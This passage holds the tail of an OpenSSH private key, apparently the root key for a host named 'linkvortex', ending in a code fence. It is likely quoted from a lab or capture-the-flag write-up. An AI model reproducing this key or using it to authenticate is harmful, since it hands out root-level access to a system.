5oB7MApRKxyy/wmgW/9OIOuQNMREgLeR9cLkl4JoqWU/DKueJWeGTTID4ud482W2hxhwAh
sS4KwSubuJhd7y30httOopQIFNbFBE3ZFc/MGLkG9kuArdAE9eKG5o3u6KktHAalRGPP5u
qJWGn/1PHcBP8PW3qLB+k+2qxFMJ4QAAAAMBAAEAAAGABtJHSkyy0pTqO+Td19JcDAxG1b
O22o01ojNZW8Nml3ehLDm+APIfN9oJp7EpVRWitY51QmRYLH3TieeMc0Uu88o795WpTZts
ZLEtfav856PkXKcBIySdU6DrVskbTr4qJKI29qfSTF5lA82SigUnaP+fd7D3g5aGaLn69b
qcjKAXgo+Vh1/dkDHqPkY4An8kgHtJRLkP7wZ5CjuFscPCYyJCnD92cRE9iA9jJWW5+/Wc
f36cvFHyWTNqmjsim4BGCeti9sUEY0Vh9M+wrWHvRhe7nlN5OYXysvJVRK4if0kwH1c6AB
VRdoXs4Iz6xMzJwqSWze+NchBlkUigBZdfcQMkIOxzj4N+mWEHru5GKYRDwL/sSxQy0tJ4
MXXgHw/58xyOE82E8n/SctmyVnHOdxAWldJeycATNJLnd0h3LnNM24vR4GvQVQ4b8EAJjj
rF3BlPov1MoK2/X3qdlwiKxFKYB4tFtugqcuXz54bkKLtLAMf9CszzVBxQqDvqLU9NAAAA
wG5DcRVnEPzKTCXAA6lNcQbIqBNyGlT0Wx0eaZ/i6oariiIm3630t2+dzohFCwh2eXS8nZ
VACuS94oITmJfcOnzXnWXiO+cuokbyb2Wmp1VcYKaBJd6S7pM1YhvQGo1JVKWe7d4g88MF
Mbf5tJRjIBdWS19frqYZDhoYUljq5ZhRaF5F/sa6cDmmMDwPMMxN7cfhRLbJ3xEIL7Kxm+
TWYfUfzJ/WhkOGkXa3q46Fhn7Z1q/qMlC7nBlJM9Iz24HAxAAAAMEAw8yotRf9ZT7intLC
+20m3kb27t8TQT5a/B7UW7UlcT61HdmGO7nKGJuydhobj7gbOvBJ6u6PlJyjxRt/bT601G
QMYCJ4zSjvxSyFaG1a0KolKuxa/9+OKNSvulSyIY/N5//uxZcOrI5hV20IiH580MqL+oU6
lM0jKFMrPoCN830kW4XimLNuRP2nar+BXKuTq9MlfwnmSe/grD9V3Qmg3qh7rieWj9uIad
1G+1d3wPKKT0ztZTPauIZyWzWpOwKVAAAAwQDKF/xbVD+t+vVEUOQiAphz6g1dnArKqf5M
SPhA2PhxB3iAqyHedSHQxp6MAlO8hbLpRHbUFyu+9qlPVrj36DmLHr2H9yHa7PZ34yRfoy
+UylRlepPz7Rw+vhGeQKuQJfkFwR/yaS7Cgy2UyM025EEtEeU3z5irLA2xlocPFijw4gUc
xmo6eXMvU90HVbakUoRspYWISr51uVEvIDuNcZUJlseINXimZkrkD40QTMrYJc9slj9wkA
ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```
